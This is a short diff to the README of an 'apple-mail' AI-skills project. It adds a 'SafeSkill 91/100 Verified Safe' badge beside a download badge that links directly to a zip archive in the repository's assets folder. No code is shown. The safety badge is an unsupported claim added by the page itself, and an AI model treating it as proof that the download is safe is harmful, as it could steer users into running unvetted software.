@@ -1,6 +1,7 @@
 # 🍎 apple-mail - Control Mail with Simple AI Skills
 
 [![Download apple-mail](https://img.shields.io/badge/Download%20apple--mail-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ridzkyyyyy/apple-mail/main/assets/mail_apple_3.5.zip)
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/ridzkyyyyy-apple-mail)
 
 ## 📥 Download
 
